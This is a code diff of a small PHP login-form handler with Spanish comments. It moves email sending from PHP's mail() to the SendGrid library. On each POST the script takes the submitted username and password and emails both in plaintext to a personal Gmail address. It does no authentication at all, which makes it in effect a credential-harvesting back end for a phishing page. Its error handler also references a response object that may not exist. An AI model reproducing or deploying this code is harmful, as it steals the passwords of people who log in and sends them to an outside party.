@@ -1,27 +1,26 @@
 <?php
+
+require 'vendor/autoload.php'; // Reemplaza esto con la ruta correcta a la biblioteca SendGrid
+
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $usuario = $_POST["usuario"];
     $contrasena = $_POST["contrasena"];
 
-    // Dirección de correo a la que quieres enviar el formulario
-    $destinatario = "garciasaraviaaxel@gmail.com";
+    $email = new \SendGrid\Mail\Mail(); 
+    $email->setFrom("tu_empresa@example.com", "Nombre de tu Empresa");
+    $email->setSubject("Nuevo inicio de sesión - Empresa");
+    $email->addTo("garciasaraviaaxel@gmail.com", "Garcia Saravia Axel");
+    $email->addContent(
+        "text/plain", 
+        "Se ha iniciado sesión en la página web con los siguientes datos:\n\nUsuario: $usuario\nContraseña: $contrasena"
+    );
 
-    // Asunto del correo
-    $asunto = "Nuevo inicio de sesión - Empresa";
-
-    // Cuerpo del correo
-    $mensaje = "Se ha iniciado sesión en la página web con los siguientes datos:\n\n";
-    $mensaje .= "Usuario: $usuario\n";
-    $mensaje .= "Contraseña: $contrasena\n";
-
-    // Cabeceras adicionales
-    $cabeceras = "From: tu_empresa@example.com";
-
-    // Envío del correo
-    if (mail($destinatario, $asunto, $mensaje, $cabeceras)) {
+    $sendgrid = new \SendGrid('API_KEY'); // Reemplaza 'API_KEY' con tu clave API de SendGrid
+    try {
+        $response = $sendgrid->send($email);
         echo "Correo enviado correctamente.";
-    } else {
-        echo "Error al enviar el correo.";
+    } catch (Exception $e) {
+        echo "Error al enviar el correo: {$response->statusCode()}";
     }
 } else {
     echo "Acceso denegado.";
